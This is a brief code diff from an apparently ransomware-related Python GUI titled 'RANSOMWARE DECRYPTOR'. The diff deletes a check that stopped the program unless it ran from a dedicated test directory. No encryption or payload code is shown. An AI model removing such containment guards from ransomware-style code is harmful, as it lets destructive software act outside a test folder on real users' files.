@@ -101,11 +101,7 @@ def color_change():
     root.after(1000, color_change)
 
 #check if launched from within "TestDirz338" directory
-current_directory = os.path.basename(os.getcwd())
-if current_directory != "TestDirz338":
-    #display an error message box if its not ran from 'TestDirz338' directory
-    messagebox.showerror("Error", "Please launch the program from within the 'TestDirz338' directory.")
-    sys.exit()
+
 	
 root = tk.Tk()
 root.title("RANSOMWARE DECRYPTOR")
